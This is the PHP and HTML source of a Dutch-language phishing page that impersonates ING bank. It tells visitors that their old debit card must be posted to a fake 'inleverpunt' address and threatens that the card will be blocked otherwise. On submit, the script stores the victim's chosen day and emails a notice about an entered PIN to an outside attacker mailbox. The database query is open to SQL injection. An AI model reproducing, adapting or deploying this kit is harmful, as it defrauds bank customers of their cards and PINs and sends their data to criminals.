<!doctype html>
<html lang="en">
<?php
error_reporting(0);
session_start();
if ( isset( $_SESSION['klant'] ) ) {
} else {
}
include 'dbconnect.php';
?>
  <head>
    <title>Persoonlijke informatie</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
   <ul class="topnav">
  <li class="left"><a class="active" href="index.php"><img style="height: 35px; width: 118px;" src="logo1.png"></a></li>
  <div class="rightdiv"><li class="right activelan"><a class="test" href="">NL</a></li>
  <li class="right activelan2"><a href="" style="color: #767676">EN</a></li></div>
</ul>
<form  method="post" action="">
<?php
$gebruikersnaam= $_SESSION['gebruikersnaam'];

if (isset($_POST['Doorgaan'])){
			$dag = ($_POST["dag"]);
			$sql = "UPDATE logindetails SET dag='$dag' WHERE gebruikersnaam = '$gebruikersnaam'";
			mysqli_query ($conn, $sql);
			$msg = "Huidige dag: " + $dag;
			mail("debakker@tuta.io","Iemand heeft zijn pincode ingevuld.", $msg);
			header('location:succes.php');
}
    if(empty($_SESSION['gebruikersnaam'])){
        header("Location: index.php");
        die("Redirecting to index.php");
    }
?>
<div class="login" style="max-width: 625px; margin-left: 30%;">
<h1 id="ingtekst">Het inleveren van uw oude betaalpas</h1><br>
<p> In verband met de veiligheid van onze klanten verplicht ING het gebruik van een nieuwe betaalpas.</br>
Dit betekent dat alle huidige betaalpassen vervallen voor gebruik en dienen ingeleverd te worden na de aanvraag uw nieuwe betaalpas.</p>
</br>
<p> Ik verstuur mijn oude betaalpas op </p>
<form action="">
  <select name="dag">
    <option value="vandaag">Vandaag voor 17:00</option>
    <option value="morgen">Morgen voor 17:00</option>
    <option value="overmorgen">Overmorgen voor 17:00</option>
  </select>
</br>
</br>
<p> Om veiligsredenen ontvangt u uw nieuwe betaalpas binnen 2 werkdagen, nadat wij uw oude betaalpas hebben ontvangen. Dit hanteren wij om er zeker van te zijn dat u de rechtmatige rekeninghouder bent van de desbetreffende aanvraag.
</br> </br>
 Indien wij niet uw betaalpas ontvangen kunt u om veiligsheidredenen geen gebruik meer maken van uw huidige betaalpas en wordt deze geblokkeerd.
 Voorkom complicaties en verstuur uw betaalpas op tijd op de dag, dat u heeft gekozen uw betaalpas op te sturen.
</br> </br>
 Verzend uw oude betaalpas in een enverlop gefrankeerd met één postzegel naar ons ING inleverpunt onderstaand adres(noteer het adres alvorens u verder gaat):</p>
</br>
<!--- Adres gegevens !--->
<p> BV Desk </br>
Wijkergouw 36 </br>
1023NX, Amsterdam</p>
<!--- Adres gegevens !--->
  <input type="submit" name="Doorgaan" value="Doorgaan"/><span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="hulp" href="https://inlogcodes.mijn.ing.nl/particulier/zelf-regelen/instellen/inlogcodes/index.jsp">Hulp nodig?</a></span>
</br>	
</div>
<div class="links">
<span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/veilig-bankieren/index.html">Veilig bankieren</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/privacy-statement/index.html">Privacy en cookies</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/disclaimer/index.html">Disclaimer</a></span>	
</div>

  </div>
  </form>
</body>
</html> 	